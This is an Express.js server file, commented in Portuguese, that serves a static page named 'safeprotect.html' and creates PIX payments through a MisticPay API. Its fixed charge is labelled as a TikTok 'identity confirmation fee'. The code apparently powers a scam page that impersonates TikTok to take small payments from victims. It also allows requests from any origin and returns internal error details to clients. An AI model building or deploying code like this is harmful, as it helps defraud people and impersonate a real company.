const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
// Usa a porta do sistema (Vercel) ou 3000 (Local)
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Serve os arquivos da pasta atual (onde está o index.html/safeprotect.html)
app.use(express.static(__dirname));

// =======================================================
// CONFIGURAÇÃO INTELIGENTE (HÍBRIDA)
// =======================================================
let config = {
    misticpay: {
        clientId: process.env.MISTICPAY_CLIENT_ID,
        clientSecret: process.env.MISTICPAY_CLIENT_SECRET,
        apiBaseUrl: 'https://api.misticpay.com/api'
    },
    payment: {
        amount: 21.67,
        description: "Taxa de Confirmacao de Identidade - TikTok",
        payerName: "Cliente Verificado",
        payerCpf: "00000000000"
    }
};

// Tenta carregar o arquivo local config.json (Apenas para uso Local no PC)
try {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        const configFile = fs.readFileSync(configPath, 'utf8');
        const localConfig = JSON.parse(configFile);
        config = localConfig;
        console.log('✅ MODO LOCAL: config.json carregado.');
    } else {
        console.log('☁️ MODO NUVEM: Usando Variáveis de Ambiente.');
    }
} catch (error) {
    console.log('⚠️ Aviso: Usando configurações de ambiente.');
}

// =======================================================
// ROTA DA API
// =======================================================
app.post('/api/create-transaction', async (req, res) => {
    console.log('🔄 Processando transação...');

    try {
        const transactionId = 'txn_' + Date.now();

        // Garante que os dados existam
        const amount = config.payment?.amount || 21.67;
        const desc = config.payment?.description || "Taxa de Serviço";

        const payload = {
            amount: amount,
            description: desc,
            transactionId: transactionId,
            payerName: req.body.payerName || "Cliente",
            payerDocument: req.body.payerDocument || "00000000000"
        };

        // Verifica se as chaves existem antes de chamar a API
        if (!config.misticpay.clientId || !config.misticpay.clientSecret) {
            throw new Error('Credenciais da API não configuradas (Variáveis de Ambiente ausentes).');
        }

        const response = await axios.post(
            `${config.misticpay.apiBaseUrl}/transactions/create`,
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'ci': config.misticpay.clientId,
                    'cs': config.misticpay.clientSecret
                }
            }
        );

        console.log('✅ PIX Gerado!');
        res.json(response.data);

    } catch (error) {
        console.error('❌ Erro:');
        if (error.response) {
            // Erro vindo da MisticPay
            console.error(JSON.stringify(error.response.data));
            res.status(error.response.status).json(error.response.data);
        } else {
            // Erro interno/código
            console.error(error.message);
            res.status(500).json({ 
                message: 'Erro interno no servidor.',
                details: error.message 
            });
        }
    }
});

// =======================================================
// INICIALIZAÇÃO (OBRIGATÓRIO PARA VERCEL)
// =======================================================

// Exporta o app para a Vercel funcionar
module.exports = app;

// Só abre a porta se estiver rodando localmente (node server.js)
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`\n🚀 Servidor rodando na porta ${PORT}`);
    });
}